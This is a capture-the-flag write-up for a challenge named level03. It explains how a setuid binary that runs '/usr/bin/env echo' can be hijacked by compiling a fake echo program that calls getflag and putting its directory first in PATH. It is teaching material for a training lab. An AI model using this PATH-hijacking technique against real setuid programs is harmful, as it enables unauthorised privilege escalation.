### level03

**Objective:**  
Exploit the `level03` binary to execute commands as `flag03`.

**Analysis:** 

When entering this level we find a 32-bit executable named level03 owned by the user `flag03` and the setuid bit is set `-rws`, which means we can execute it with the same privilage as the user `flag03`.

![information about the file using ls -la command](/level03/resources/images/permissions.png)

![type of the file using file command](/level03/resources/images/type.png)


Running the program a message gets printed "Exploit me". Challenge accepted.

![output of the binary when executed](/level03/resources/images/output.png)

Let's see the function calls made by this program using `ltrace` 

![output of function calls of level03 binary with ltrace](/level03/resources/images/ltrace.png)

We can notice that system function call has "/usr/bin/env echo Exploit me" in its parameter, 
`/usr/bin/env` causes the system to search in the directories listed in the `PATH` environment variable instead of using the echo builtin.
This creates a vulnerability if we can create our own custom echo and add its path to the beginning of `PATH` variable we can make the executable execute the `getflag` command

**Cracking process**

Let's start by creating our custom echo.c and create our fake echo binary :

```c
#include <stdlib.h>

int main() {

  system("getflag"); 

  return 0;
}
````

```bash
gcc -o echo echo.c
```

Then we will add the path of our echo to `PATH`

```bash
PATH=/path_to_our_echo:$PATH
``` 

now when we execute `level03` and get the password for the next level

![output of the binary exploited showing the password](/level03/resources/images/password.png)